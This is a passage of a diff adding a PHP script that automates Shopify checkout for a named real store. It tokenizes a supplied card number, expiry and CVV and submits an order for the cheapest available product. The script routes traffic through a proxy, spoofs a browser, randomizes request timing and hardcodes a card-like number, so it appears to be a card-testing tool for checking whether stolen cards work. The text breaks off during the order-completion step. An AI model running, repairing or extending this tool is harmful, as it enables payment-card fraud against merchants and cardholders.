@@ -1,0 +1,1168 @@
+<?php
+declare(strict_types=1);
+
+
+
+$SHOP_URL = 'https://edifier-usa.myshopify.com';
+
+
+$CARD_INPUT = '4921603179807358|06|30|944';
+
+$PROXY = null;
+
+
+if (is_string($CARD_INPUT) && strpos($CARD_INPUT, '|') !== false) {
+    $parts = explode('|', $CARD_INPUT);
+    $CARD_DATA = [
+        'number' => trim($parts[0]),
+        'month' => (int)trim($parts[1]),
+        'year' => (int)trim($parts[2]),
+        'cvv' => trim($parts[3]),
+        'name' => 'John Doe'
+    ];
+} else {
+    $CARD_DATA = is_array($CARD_INPUT) ? $CARD_INPUT : [
+        'number' => '4532015112830366',
+        'month' => 12,
+        'year' => 2025,
+        'cvv' => '123',
+        'name' => 'John Doe'
+    ];
+}
+
+
+
+ini_set('display_errors', '0');
+error_reporting(E_ALL);
+
+
+$CHECKOUT_DATA = [
+    'email' => 'test@example.com',
+    'first_name' => 'John',
+    'last_name' => 'Doe',
+    'address1' => '4024 College Point Boulevard',
+    'address2' => '',
+    'city' => 'Flushing',
+    'province' => 'NY',
+    'zip' => '11354',
+    'country' => 'US',
+    'phone' => '2494851515',
+    'coordinates' => [
+        'latitude' => 40.7589,
+        'longitude' => -73.9851
+    ]
+];
+
+class ShopifyCheckout {
+    private $shopUrl;
+    private $ch;
+    private $cookies = [];
+    private $proxy;
+    public $lastHttpStatus;
+    public $lastError;
+    
+    public function __construct($shopUrl, $proxy = null) {
+        $this->shopUrl = rtrim($shopUrl, '/');
+        $this->proxy = $proxy;
+        $this->ch = curl_init();
+        curl_setopt_array($this->ch, [
+            CURLOPT_RETURNTRANSFER => true,
+            CURLOPT_FOLLOWLOCATION => true,
+            CURLOPT_SSL_VERIFYPEER => false,
+            CURLOPT_SSL_VERIFYHOST => false,
+            CURLOPT_USERAGENT => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36',
+            CURLOPT_TIMEOUT => 30,
+            CURLOPT_CONNECTTIMEOUT => 30,
+            CURLOPT_COOKIEJAR => '',
+            CURLOPT_COOKIEFILE => '',
+            CURLOPT_HEADER => true,
+        ]);
+        
+        if ($proxy) {
+            curl_setopt($this->ch, CURLOPT_PROXY, $proxy);
+            curl_setopt($this->ch, CURLOPT_PROXYAUTH, CURLAUTH_ANY);
+        }
+    }
+    
+    private function extractCookies($headers) {
+        preg_match_all('/Set-Cookie:\s*([^;]+)/i', $headers, $matches);
+        foreach ($matches[1] as $cookie) {
+            $parts = explode('=', $cookie, 2);
+            if (count($parts) == 2) {
+                $this->cookies[trim($parts[0])] = trim($parts[1]);
+            }
+        }
+    }
+    
+    private function getCookieString() {
+        $cookieParts = [];
+        foreach ($this->cookies as $name => $value) {
+            $cookieParts[] = "$name=$value";
+        }
+        return implode('; ', $cookieParts);
+    }
+    
+    private function request($url, $method = 'GET', $data = null, $headers = []) {
+        curl_setopt($this->ch, CURLOPT_URL, $url);
+        curl_setopt($this->ch, CURLOPT_CUSTOMREQUEST, $method);
+        
+
+        $defaultHeaders = [
+            'Accept: application/json',
+            'Accept-Language: en-US,en;q=0.9',
+            'Content-Type: application/json',
+            'Origin: ' . $this->shopUrl,
+            'Referer: ' . $this->shopUrl . '/',
+        ];
+        
+        $allHeaders = array_merge($defaultHeaders, $headers);
+        curl_setopt($this->ch, CURLOPT_HTTPHEADER, $allHeaders);
+        
+        if ($method === 'POST' && $data !== null) {
+            curl_setopt($this->ch, CURLOPT_POSTFIELDS, json_encode($data));
+        } else {
+            curl_setopt($this->ch, CURLOPT_POSTFIELDS, null);
+        }
+        
+        $cookieString = $this->getCookieString();
+        if (!empty($cookieString)) {
+            curl_setopt($this->ch, CURLOPT_COOKIE, $cookieString);
+        }
+        
+        $response = curl_exec($this->ch);
+        $headerSize = curl_getinfo($this->ch, CURLINFO_HEADER_SIZE);
+        $statusCode = curl_getinfo($this->ch, CURLINFO_HTTP_CODE);
+        $error = curl_error($this->ch);
+        
+        $this->lastHttpStatus = $statusCode;
+        
+        if ($error) {
+            throw new Exception("cURL Error: $error");
+        }
+        
+        $headers = substr($response, 0, $headerSize);
+        $body = substr($response, $headerSize);
+        
+        $this->extractCookies($headers);
+        
+        return [
+            'status' => $statusCode,
+            'headers' => $headers,
+            'body' => $body,
+            'url' => curl_getinfo($this->ch, CURLINFO_EFFECTIVE_URL)
+        ];
+    }
+    
+
+    public function step0_detectProduct() {
+        echo "[0/5] Auto-detecting cheapest product...\n";
+        
+        try {
+            echo "  Trying /collections/all/products.json...\n";
+            $response = $this->request($this->shopUrl . '/collections/all/products.json?limit=250');
+            if ($response['status'] == 200) {
+                $data = json_decode($response['body'], true);
+                $products = isset($data['products']) ? $data['products'] : (is_array($data) ? $data : []);
+                $best = $this->findCheapestProduct($products);
+                if ($best) {
+                    echo "  ✅ Cheapest product found: {$best['title']} \${$best['price_str']}\n";
+                    return $best;
+                }
+            }
+        } catch (Exception $e) {
+            echo "  ⚠️ Error: " . $e->getMessage() . "\n";
+        }
+        
+        echo "  ❌ Could not find products on this site\n";
+        return null;
+    }
+    
+    private function findCheapestProduct($products) {
+        $validCandidates = [];
+        
+        foreach ($products as $product) {
+            $productId = $product['id'] ?? null;
+            $productTitle = $product['title'] ?? 'Unknown';
+            $variants = $product['variants'] ?? [];
+            
+            foreach ($variants as $variant) {
+                $variantId = $variant['id'] ?? null;
+                $priceStr = $variant['price'] ?? '0';
+                $price = floatval($priceStr);
+                
+                if ($price <= 0) continue;
+                
+                $available = $variant['available'] ?? null;
+                if ($available === null) {
+                    $invQty = $variant['inventory_quantity'] ?? 0;
+                    $invPolicy = strtolower($variant['inventory_policy'] ?? '');
+                    $available = ($invQty > 0) || ($invPolicy === 'continue');
+                }
+                
+                if (!$available) continue;
+                
+                $validCandidates[] = [
+                    'product_id' => (string)$productId,
+                    'variant_id' => (string)$variantId,
+                    'price' => $price,
+                    'price_str' => $priceStr,
+                    'title' => $productTitle
+                ];
+            }
+        }
+        
+        if (empty($validCandidates)) {
+            return null;
+        }
+        
+        usort($validCandidates, function($a, $b) {
+            return $a['price'] <=> $b['price'];
+        });
+        
+        return $validCandidates[0];
+    }
+    
+
+    public function step1_addToCart($variantId) {
+        echo "[1/5] Adding to cart and creating checkout...\n";
+        
+        usleep(rand(100000, 300000));
+        
+        try {
+            $addUrl = $this->shopUrl . '/cart/add.js';
+            $payload = ['id' => $variantId, 'quantity' => 1];
+            
+            echo "  POST $addUrl\n";
+            $response = $this->request($addUrl, 'POST', $payload);
+            echo "  Add to cart: {$response['status']}\n";
+            
+            if ($response['status'] != 200) {
+                echo "  ❌ Failed to add to cart\n";
+                return null;
+            }
+        } catch (Exception $e) {
+            echo "  ❌ Error adding to cart: " . $e->getMessage() . "\n";
+            return null;
+        }
+        
+        usleep(rand(100000, 300000));
+        
+        try {
+            $checkoutUrl = $this->shopUrl . '/checkout';
+            echo "  GET $checkoutUrl\n";
+            $response = $this->request($checkoutUrl, 'GET');
+            
+            if ($response['status'] != 200) {
+                echo "  ❌ Failed to get checkout page\n";
+                return null;
+            }
+            
+            $finalUrl = $response['url'];
+            $html = $response['body'];
+            
+            $checkoutToken = null;
+            if (preg_match('/\/checkouts\/cn\/([^\/\?\#]+)/', $finalUrl, $matches)) {
+                $checkoutToken = $matches[1];
+                echo "  ✅ Checkout token: $checkoutToken\n";
+            } else {
+                echo "  ❌ Could not extract checkout token\n";
+                return null;
+            }
+            
+            $sessionToken = null;
+            if (preg_match('/<meta\s+name="serialized-session-token"\s+content="([^"]+)"/', $html, $matches)) {
+                $sessionToken = html_entity_decode($matches[1], ENT_QUOTES | ENT_HTML5);
+                $sessionToken = trim($sessionToken, '"');
+                echo "  ✅ Session token extracted\n";
+            } else {
+                echo "  ⚠️ Session token not found\n";
+            }
+            
+            if (!$checkoutToken || !$sessionToken) {
+                return null;
+            }
+            
+            return [
+                'checkout_token' => $checkoutToken,
+                'session_token' => $sessionToken,
+                'cookies' => $this->cookies
+            ];
+            
+        } catch (Exception $e) {
+            echo "  ❌ Error getting checkout: " . $e->getMessage() . "\n";
+            return null;
+        }
+    }
+    
+
+    public function step2_tokenizeCard($shopUrl, $cardData) {
+        echo "[2/5] Tokenizing credit card...\n";
+        
+        $parsedUrl = parse_url($shopUrl);
+        $scopeHost = $parsedUrl['host'] ?? str_replace(['https://', 'http://'], '', $shopUrl);
+        $scopeHost = explode('/', $scopeHost)[0];
+        
+        usleep(rand(200000, 500000));
+        
+        $payload = [
+            'credit_card' => [
+                'number' => $cardData['number'],
+                'month' => $cardData['month'],
+                'year' => $cardData['year'],
+                'verification_value' => $cardData['verification_value'],
+                'start_month' => null,
+                'start_year' => null,
+                'issue_number' => '',
+                'name' => $cardData['name']
+            ],
+            'payment_session_scope' => $scopeHost
+        ];
+        
+        $endpointUrl = 'https://checkout.pci.shopifyinc.com/sessions';
+        
+        $headers = [
+            'Accept: application/json',
+            'Content-Type: application/json',
+            'Origin: https://checkout.pci.shopifyinc.com',
+            'Referer: https://checkout.pci.shopifyinc.com/',
+        ];
+        
+        try {
+            echo "  POST $endpointUrl\n";
+            
+            $ch = curl_init();
+            curl_setopt_array($ch, [
+                CURLOPT_URL => $endpointUrl,
+                CURLOPT_RETURNTRANSFER => true,
+                CURLOPT_POST => true,
+                CURLOPT_POSTFIELDS => json_encode($payload),
+                CURLOPT_HTTPHEADER => $headers,
+                CURLOPT_SSL_VERIFYPEER => false,
+                CURLOPT_SSL_VERIFYHOST => false,
+                CURLOPT_TIMEOUT => 30,
+            ]);
+            
+            if ($this->proxy) {
+                curl_setopt($ch, CURLOPT_PROXY, $this->proxy);
+                curl_setopt($ch, CURLOPT_PROXYAUTH, CURLAUTH_ANY);
+            }
+            
+            $response = curl_exec($ch);
+            $statusCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+            $error = curl_error($ch);
+            
+            if ($error) {
+                echo "  ❌ cURL Error: $error\n";
+                return ['success' => false, 'error' => $error];
+            }
+            
+            echo "  Status: $statusCode\n";
+            
+            if ($statusCode != 200) {
+                echo "  ❌ HTTP $statusCode\n";
+                return ['success' => false, 'error' => "HTTP $statusCode"];
+            }
+            
+            $tokenData = json_decode($response, true);
+            $cardSessionId = $tokenData['id'] ?? null;
+            
+            if ($cardSessionId) {
+                echo "  ✅ Card session ID: $cardSessionId\n";
+                return ['success' => true, 'card_session_id' => $cardSessionId];
+            } else {
+                echo "  ❌ No card session ID in response\n";
+                return ['success' => false, 'error' => 'No card session ID'];
+            }
+            
+        } catch (Exception $e) {
+            echo "  ❌ Error: " . $e->getMessage() . "\n";
+            return ['success' => false, 'error' => $e->getMessage()];
+        }
+    }
+    
+
+    public function step3_proposal($checkoutToken, $sessionToken, $variantId, $checkoutData) {
+        echo "[3/5] Submitting proposal...\n";
+        
+        usleep(rand(200000, 500000));
+        
+
+        $merchandiseStableId = sprintf(
+            '%04x%04x-%04x-%04x-%04x-%04x%04x%04x',
+            mt_rand(0, 0xffff), mt_rand(0, 0xffff),
+            mt_rand(0, 0xffff),
+            mt_rand(0, 0x0fff) | 0x4000,
+            mt_rand(0, 0x3fff) | 0x8000,
+            mt_rand(0, 0xffff), mt_rand(0, 0xffff), mt_rand(0, 0xffff)
+        );
+        
+        $url = $this->shopUrl . '/checkouts/unstable/graphql?operationName=Proposal';
+        
+        $query = 'query Proposal($sessionInput:SessionTokenInput!,$delivery:DeliveryTermsInput,$merchandise:MerchandiseTermInput,$payment:PaymentTermInput,$buyerIdentity:BuyerIdentityTermInput,$taxes:TaxTermInput,$tip:TipTermInput,$note:NoteInput,$scriptFingerprint:ScriptFingerprintInput,$optionalDuties:OptionalDutiesInput,$cartMetafields:[CartMetafieldOperationInput!],$memberships:MembershipsInput){session(sessionInput:$sessionInput){negotiate(input:{purchaseProposal:{delivery:$delivery,merchandise:$merchandise,payment:$payment,buyerIdentity:$buyerIdentity,taxes:$taxes,tip:$tip,note:$note,scriptFingerprint:$scriptFingerprint,optionalDuties:$optionalDuties,cartMetafields:$cartMetafields,memberships:$memberships}}){__typename result{...on NegotiationResultAvailable{queueToken sellerProposal{deliveryExpectations{...on FilledDeliveryExpectationTerms{deliveryExpectations{signedHandle __typename}__typename}...on PendingTerms{pollDelay __typename}__typename}delivery{...on FilledDeliveryTerms{deliveryLines{availableDeliveryStrategies{...on CompleteDeliveryStrategy{handle phoneRequired amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}__typename}__typename}checkoutTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}runningTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}}}}';
+        
+
+        $deliveryLine = [
+            'destination' => [
+                'partialStreetAddress' => [
+                    'address1' => $checkoutData['address1'],
+                    'address2' => $checkoutData['address2'] ?? '',
+                    'city' => $checkoutData['city'],
+                    'countryCode' => $checkoutData['country'],
+                    'postalCode' => $checkoutData['zip'],
+                    'firstName' => $checkoutData['first_name'],
+                    'lastName' => $checkoutData['last_name'],
+                    'zoneCode' => $checkoutData['province'],
+                    'phone' => $checkoutData['phone'],
+                    'oneTimeUse' => false,
+                    'coordinates' => $checkoutData['coordinates'] ?? [
+                        'latitude' => 40.7589,
+                        'longitude' => -73.9851
+                    ]
+                ]
+            ],
+            'selectedDeliveryStrategy' => [
+                'deliveryStrategyByHandle' => [
+                    'handle' => 'any',
+                    'customDeliveryRate' => false
+                ]
+            ],
+            'targetMerchandiseLines' => [
+                'lines' => [
+                    ['stableId' => $merchandiseStableId]
+                ]
+            ],
+            'deliveryMethodTypes' => ['SHIPPING'],
+            'destinationChanged' => true,
+            'expectedTotalPrice' => ['any' => true]
+        ];
+        
+        $billingAddress = [
+            'address1' => $checkoutData['address1'],
+            'address2' => $checkoutData['address2'] ?? '',
+            'city' => $checkoutData['city'],
+            'countryCode' => $checkoutData['country'],
+            'postalCode' => $checkoutData['zip'],
+            'firstName' => $checkoutData['first_name'],
+            'lastName' => $checkoutData['last_name'],
+            'zoneCode' => $checkoutData['province'],
+            'phone' => $checkoutData['phone']
+        ];
+        
+        $variables = [
+            'sessionInput' => ['sessionToken' => $sessionToken],
+            'delivery' => [
+                'deliveryLines' => [$deliveryLine],
+                'noDeliveryRequired' => [],
+                'supportsSplitShipping' => true
+            ],
+            'payment' => [
+                'totalAmount' => ['any' => true],
+                'paymentLines' => [],
+                'billingAddress' => ['streetAddress' => $billingAddress]
+            ],
+            'merchandise' => [
+                'merchandiseLines' => [[
+                    'stableId' => $merchandiseStableId,
+                    'merchandise' => [
+                        'productVariantReference' => [
+                            'id' => "gid://shopify/ProductVariantMerchandise/{$variantId}",
+                            'variantId' => "gid://shopify/ProductVariant/{$variantId}",
+                            'properties' => [],
+                            'sellingPlanId' => null
+                        ]
+                    ],
+                    'quantity' => ['items' => ['value' => 1]],
+                    'expectedTotalPrice' => ['any' => true],
+                    'lineComponents' => []
+                ]]
+            ],
+            'buyerIdentity' => [
+                'customer' => [
+                    'presentmentCurrency' => 'USD',
+                    'countryCode' => $checkoutData['country']
+                ],
+                'email' => $checkoutData['email']
+            ],
+            'taxes' => ['proposedTotalAmount' => ['any' => true]],
+            'tip' => ['tipLines' => []],
+            'note' => ['message' => null, 'customAttributes' => []],
+            'scriptFingerprint' => [
+                'signature' => null,
+                'signatureUuid' => null,
+                'lineItemScriptChanges' => [],
+                'paymentScriptChanges' => [],
+                'shippingScriptChanges' => []
+            ],
+            'optionalDuties' => ['buyerRefusesDuties' => false],
+            'cartMetafields' => [],
+            'memberships' => ['memberships' => []]
+        ];
+        
+        $payload = [
+            'operationName' => 'Proposal',
+            'query' => $query,
+            'variables' => $variables
+        ];
+        
+        $headers = [
+            'shopify-checkout-client: checkout-web/1.0',
+            'shopify-checkout-source: id="' . $checkoutToken . '", type="cn"',
+            'x-checkout-web-source-id: ' . $checkoutToken,
+            'x-checkout-one-session-token: ' . $sessionToken,
+        ];
+        
+        try {
+            echo "  POST $url\n";
+            $response = $this->request($url, 'POST', $payload, $headers);
+            
+            if ($response['status'] != 200) {
+                echo "  ❌ HTTP {$response['status']}\n";
+                echo "  Response body: " . substr($response['body'], 0, 500) . "\n";
+                return null;
+            }
+            
+            $data = json_decode($response['body'], true);
+            
+
+            if (isset($data['errors'])) {
+                echo "  ❌ GraphQL errors:\n";
+                foreach ($data['errors'] as $error) {
+                    echo "    - " . ($error['message'] ?? 'Unknown') . "\n";
+                }
+                echo "  Full response: " . json_encode($data, JSON_PRETTY_PRINT) . "\n";
+                return null;
+            }
+            
+            $result = $data['data']['session']['negotiate']['result'] ?? null;
+            
+            if (!$result) {
+                echo "  ❌ Invalid result\n";
+                echo "  Response structure: " . json_encode($data, JSON_PRETTY_PRINT) . "\n";
+                return null;
+            }
+            
+            $resultType = $result['__typename'] ?? 'Unknown';
+            echo "  Result type: $resultType\n";
+            
+            if ($resultType !== 'NegotiationResultAvailable') {
+                echo "  ❌ Unexpected result type: $resultType\n";
+                echo "  Full result: " . json_encode($result, JSON_PRETTY_PRINT) . "\n";
+                return null;
+            }
+            
+            $queueToken = $result['queueToken'] ?? null;
+            $sellerProposal = $result['sellerProposal'] ?? [];
+            
+            $shippingHandle = null;
+            $shippingAmount = null;
+            $phoneRequired = false;
+            $deliveryTerms = $sellerProposal['delivery'] ?? [];
+            
+            echo "  Delivery terms type: " . ($deliveryTerms['__typename'] ?? 'null') . "\n";
+            
+            if (($deliveryTerms['__typename'] ?? '') === 'FilledDeliveryTerms') {
+                $deliveryLines = $deliveryTerms['deliveryLines'] ?? [];
+                if (!empty($deliveryLines)) {
+                    $strategies = $deliveryLines[0]['availableDeliveryStrategies'] ?? [];
+                    if (!empty($strategies)) {
+                        $shippingHandle = $strategies[0]['handle'] ?? null;
+                        $phoneRequired = $strategies[0]['phoneRequired'] ?? false;
+                        $amountConstraint = $strategies[0]['amount'] ?? [];
+                        if (($amountConstraint['__typename'] ?? '') === 'MoneyValueConstraint') {
+                            $shippingAmount = $amountConstraint['value']['amount'] ?? null;
+                        }
+                    }
+                }
+            } elseif (($deliveryTerms['__typename'] ?? '') === 'PendingTerms') {
+
+                echo "  ⏳ Delivery terms pending, polling...\n";
+                $pollDelay = $deliveryTerms['pollDelay'] ?? 2000;
+                $maxPollAttempts = 10;
+                
+                for ($pollAttempt = 0; $pollAttempt < $maxPollAttempts; $pollAttempt++) {
+                    $waitSeconds = min($pollDelay / 1000.0, 3.0);
+                    echo "  [POLL] Attempt " . ($pollAttempt + 1) . "/$maxPollAttempts, waiting {$waitSeconds}s...\n";
+                    usleep((int)($waitSeconds * 1000000));
+                    
+                    try {
+                        $pollResponse = $this->request($url, 'POST', $payload, $headers);
+                        
+                        if ($pollResponse['status'] != 200) {
+                            echo "  ⚠️ Poll HTTP {$pollResponse['status']}, retrying...\n";
+                            continue;
+                        }
+                        
+                        $pollData = json_decode($pollResponse['body'], true);
+                        
+                        if (json_last_error() !== JSON_ERROR_NONE || isset($pollData['errors'])) {
+                            echo "  ⚠️ Poll error, retrying...\n";
+                            continue;
+                        }
+                        
+                        $pollResult = $pollData['data']['session']['negotiate']['result'] ?? null;
+                        
+                        if (!$pollResult || ($pollResult['__typename'] ?? '') !== 'NegotiationResultAvailable') {
+                            echo "  ⚠️ Poll invalid result, retrying...\n";
+                            continue;
+                        }
+                        
+                        $pollSellerProposal = $pollResult['sellerProposal'] ?? [];
+                        $pollDeliveryTerms = $pollSellerProposal['delivery'] ?? [];
+                        $pollDeliveryType = $pollDeliveryTerms['__typename'] ?? 'Unknown';
+                        
+                        echo "  [POLL] Delivery type: $pollDeliveryType\n";
+                        
+                        if ($pollDeliveryType === 'FilledDeliveryTerms') {
+
+                            $pollDeliveryLines = $pollDeliveryTerms['deliveryLines'] ?? [];
+                            if (!empty($pollDeliveryLines)) {
+                                $pollStrategies = $pollDeliveryLines[0]['availableDeliveryStrategies'] ?? [];
+                                if (!empty($pollStrategies)) {
+                                    $shippingHandle = $pollStrategies[0]['handle'] ?? null;
+                                    $phoneRequired = $pollStrategies[0]['phoneRequired'] ?? false;
+                                    $pollAmountConstraint = $pollStrategies[0]['amount'] ?? [];
+                                    if (($pollAmountConstraint['__typename'] ?? '') === 'MoneyValueConstraint') {
+                                        $shippingAmount = $pollAmountConstraint['value']['amount'] ?? null;
+                                    }
+                                    
+
+                                    if (isset($pollResult['queueToken'])) {
+                                        $queueToken = $pollResult['queueToken'];
+                                    }
+                                    
+
+                                    $pollCheckoutTotal = $pollSellerProposal['checkoutTotal'] ?? null;
+                                    if ($pollCheckoutTotal && ($pollCheckoutTotal['__typename'] ?? '') === 'MoneyValueConstraint') {
+                                        $actualTotal = $pollCheckoutTotal['value']['amount'] ?? null;
+                                    }
+                                    
+
+                                    $pollDeliveryExpTerms = $pollSellerProposal['deliveryExpectations'] ?? [];
+                                    if (($pollDeliveryExpTerms['__typename'] ?? '') === 'FilledDeliveryExpectationTerms') {
+                                        $pollExpectations = $pollDeliveryExpTerms['deliveryExpectations'] ?? [];
+                                        $deliveryExpectations = [];
+                                        foreach ($pollExpectations as $exp) {
+                                            $signedHandle = $exp['signedHandle'] ?? null;
+                                            if ($signedHandle) {
+                                                $deliveryExpectations[] = ['signedHandle' => $signedHandle];
+                                            }
+                                        }
+                                    }
+                                    
+                                    echo "  ✅ Poll successful! Got shipping handle\n";
+                                    break;
+                                }
+                            }
+                        } elseif ($pollDeliveryType === 'PendingTerms') {
+
+                            $pollDelay = $pollDeliveryTerms['pollDelay'] ?? 2000;
+                            continue;
+                        } else {
+                            echo "  ⚠️ Unexpected delivery type: $pollDeliveryType\n";
+                            continue;
+                        }
+                    } catch (Exception $pollError) {
+                        echo "  ⚠️ Poll exception: " . $pollError->getMessage() . "\n";
+                        continue;
+                    }
+                }
+                
+                if (!$shippingHandle) {
+                    echo "  ❌ Polling timed out, no shipping handle\n";
+                }
+            }
+            
+            if ($shippingHandle) {
+                echo "  ✅ Shipping handle: " . substr($shippingHandle, 0, 50) . "...\n";
+            } else {
+                echo "  ⚠️ No shipping handle found\n";
+            }
+            if ($shippingAmount) {
+                echo "  ✅ Shipping amount: \${$shippingAmount}\n";
+            }
+            
+            $actualTotal = null;
+            $checkoutTotal = $sellerProposal['checkoutTotal'] ?? null;
+            if ($checkoutTotal && ($checkoutTotal['__typename'] ?? '') === 'MoneyValueConstraint') {
+                $actualTotal = $checkoutTotal['value']['amount'] ?? null;
+            }
+            
+            $deliveryExpectations = [];
+            $deliveryExpTerms = $sellerProposal['deliveryExpectations'] ?? [];
+            if (($deliveryExpTerms['__typename'] ?? '') === 'FilledDeliveryExpectationTerms') {
+                $expectations = $deliveryExpTerms['deliveryExpectations'] ?? [];
+                foreach ($expectations as $exp) {
+                    $signedHandle = $exp['signedHandle'] ?? null;
+                    if ($signedHandle) {
+                        $deliveryExpectations[] = ['signedHandle' => $signedHandle];
+                    }
+                }
+            }
+            
+            echo "  ✅ Queue token: $queueToken\n";
+            if ($shippingHandle) {
+                echo "  ✅ Shipping handle: " . substr($shippingHandle, 0, 50) . "...\n";
+            }
+            if ($actualTotal) {
+                echo "  ✅ Total: \${$actualTotal}\n";
+            }
+            
+            
+            return [
+                'queue_token' => $queueToken,
+                'shipping_handle' => $shippingHandle,
+                'shipping_amount' => $shippingAmount,
+                'merchandise_stable_id' => $merchandiseStableId,
+                'actual_total' => $actualTotal,
+                'delivery_expectations' => $deliveryExpectations,
+                'phone_required' => $phoneRequired
+            ];
+            
+        } catch (Exception $e) {
+            echo "  ❌ Error: " . $e->getMessage() . "\n";
+            return null;
+        }
+    }
+    
+
+    public function step4_submitCompletion(
+        $checkoutToken,
+        $sessionToken,
+        $queueToken,
+        $shippingHandle,
+        $merchandiseStableId,
+        $cardSessionId,
+        $actualTotal,
+        $deliveryExpectations,
+        $variantId,
+        $checkoutData
+    ) {
+        echo "[4/5] Submitting for completion...\n";
+        
+        usleep(rand(300000, 800000));
+        
+        $url = $this->shopUrl . '/checkouts/unstable/graphql?operationName=SubmitForCompletion';
+        
+        $attemptToken = $checkoutToken . '-' . substr(bin2hex(random_bytes(5)), 0, 10);
+        
+
+        $deliveryLine = [
+            'destination' => [
+                'streetAddress' => [
+                    'address1' => $checkoutData['address1'],
+                    'address2' => $checkoutData['address2'] ?? '',
+                    'city' => $checkoutData['city'],
+                    'countryCode' => $checkoutData['country'],
+                    'postalCode' => $checkoutData['zip'],
+                    'firstName' => $checkoutData['first_name'],
+                    'lastName' => $checkoutData['last_name'],
+                    'zoneCode' => $checkoutData['province'],
+                    'phone' => $checkoutData['phone'],
+                    'oneTimeUse' => false,
+                    'coordinates' => $checkoutData['coordinates'] ?? [
+                        'latitude' => 40.7589,
+                        'longitude' => -73.9851
+                    ]
+                ]
+            ],
+            'selectedDeliveryStrategy' => [
+                'deliveryStrategyByHandle' => [
+                    'handle' => $shippingHandle,
+                    'customDeliveryRate' => false
+                ],
+                'options' => (object)[]  // empty object
+            ],
+            'targetMerchandiseLines' => [
+                'lines' => [
+                    ['stableId' => $merchandiseStableId]
+                ]
+            ],
+            'deliveryMethodTypes' => ['SHIPPING'],
+            'destinationChanged' => false,
+            'expectedTotalPrice' => ['any' => true]
+        ];
+        
+        $billingAddress = [
+            'address1' => $checkoutData['address1'],
+            'address2' => $checkoutData['address2'] ?? '',
+            'city' => $checkoutData['city'],
+            'countryCode' => $checkoutData['country'],
+            'postalCode' => $checkoutData['zip'],
+            'firstName' => $checkoutData['first_name'],
+            'lastName' => $checkoutData['last_name'],
+            'zoneCode' => $checkoutData['province'],
+            'phone' => $checkoutData['phone']
+        ];
+        
+        $query = 'mutation SubmitForCompletion($input:NegotiationInput!,$attemptToken:String!,$metafields:[MetafieldInput!],$postPurchaseInquiryResult:PostPurchaseInquiryResultCode,$analytics:AnalyticsInput){submitForCompletion(input:$input attemptToken:$attemptToken metafields:$metafields postPurchaseInquiryResult:$postPurchaseInquiryResult analytics:$analytics){...on SubmitSuccess{receipt{...on ProcessedReceipt{id __typename}...on ProcessingReceipt{id __typename}__typename}__typename}...on SubmitAlreadyAccepted{receipt{...on ProcessedReceipt{id __typename}...on ProcessingReceipt{id __typename}__typename}__typename}...on SubmitFailed{reason __typename}...on SubmitRejected{errors{code localizedMessage __typename}__typename}...on Throttled{pollAfter __typename}...on SubmittedForCompletion{receipt{...on ProcessedReceipt{id __typename}...on ProcessingReceipt{id __typename}__typename}__typename}__typename}}';
+        
+        $inputData = [
+            'sessionInput' => ['sessionToken' => $sessionToken],
+            'queueToken' => $queueToken,
+            'delivery' => [
+                'deliveryLines' => [$deliveryLine],
+                'noDeliveryRequired' => [],
+                'useProgressiveRates' => false,
+                'prefetchShippingRatesStrategy' => null,
+                'supportsSplitShipping' => true
+            ],
+            'merchandise' => [
+                'merchandiseLines' => [[
+                    'stableId' => $merchandiseStableId,
+                    'merchandise' => [
+                        'productVariantReference' => [
+                            'id' => "gid://shopify/ProductVariantMerchandise/{$variantId}",
+                            'variantId' => "gid://shopify/ProductVariant/{$variantId}",
+                            'properties' => [],
+                            'sellingPlanId' => null
+                        ]
+                    ],
+                    'quantity' => ['items' => ['value' => 1]],
+                    'expectedTotalPrice' => ['any' => true],
+                    'lineComponents' => []
+                ]]
+            ],
+            'memberships' => ['memberships' => []],
+            'payment' => [
+                'totalAmount' => ['any' => true],
+                'paymentLines' => [[
+                    'paymentMethod' => [
+                        'directPaymentMethod' => [
+                            'paymentMethodIdentifier' => 'bfe4013b52b37df95b64c063a41da319',
+                            'sessionId' => $cardSessionId,
+                            'billingAddress' => ['streetAddress' => $billingAddress],
+                            'cardSource' => null
+                        ]
+                    ],
+                    'amount' => ['any' => true]
+                ]],
+                'billingAddress' => ['streetAddress' => $billingAddress]
+            ],
+            'buyerIdentity' => [
+                'customer' => [
+                    'presentmentCurrency' => 'USD',
+                    'countryCode' => $checkoutData['country']
+                ],
+                'email' => $checkoutData['email'],
+                'emailChanged' => false,
+                'phoneCountryCode' => 'US',
+                'marketingConsent' => [
+                    ['email' => ['value' => $checkoutData['email']]]
+                ],
+                'shopPayOptInPhone' => [
+                    'number' => $checkoutData['phone'],
+                    'countryCode' => 'US'
+                ],
+                'rememberMe' => false
+            ],
+            'tip' => ['tipLines' => []],
+            'taxes' => [
+                'proposedTotalAmount' => ['any' => true]
+            ],
+            'note' => ['message' => null, 'customAttributes' => []],
+            'localizationExtension' => ['fields' => []],
+            'nonNegotiableTerms' => null,
+            'scriptFingerprint' => [
+                'signature' => null,
+                'signatureUuid' => null,
+                'lineItemScriptChanges' => [],
+                'paymentScriptChanges' => [],
+                'shippingScriptChanges' => []
+            ],
+            'optionalDuties' => ['buyerRefusesDuties' => false],
+            'cartMetafields' => []
+        ];
+        
+        if (!empty($deliveryExpectations)) {
+            $inputData['deliveryExpectations'] = [
+                'deliveryExpectationLines' => $deliveryExpectations
+            ];
+        }
+        
+        $variables = [
+            'attemptToken' => $attemptToken,
+            'input' => $inputData
+        ];
+        
+        $payload = [
+            'operationName' => 'SubmitForCompletion',
+            'query' => $query,
+            'variables' => $variables
+        ];
+        
+        $headers = [
+            'shopify-checkout-client: checkout-web/1.0',
+            'shopify-checkout-source: id="' . $checkoutToken . '", type="cn"',
+            'x-checkout-one-session-token: ' . $sessionToken,
+            'x-checkout-web-source-id: ' . $checkoutToken,
+        ];
+        
+        try {
+            echo "  POST $url\n";
+            $response = $this->request($url, 'POST', $payload, $headers);
+            
+            if ($response['status'] != 200) {
+                echo "  ❌ HTTP {$response['status']}\n";
+                echo "  Response body: " . substr($response['body'], 0, 500) . "\n";
+                return null;
+            }
+            
+            $data = json_decode($response['body'], true);
+            
+
+            if (isset($data['errors'])) {
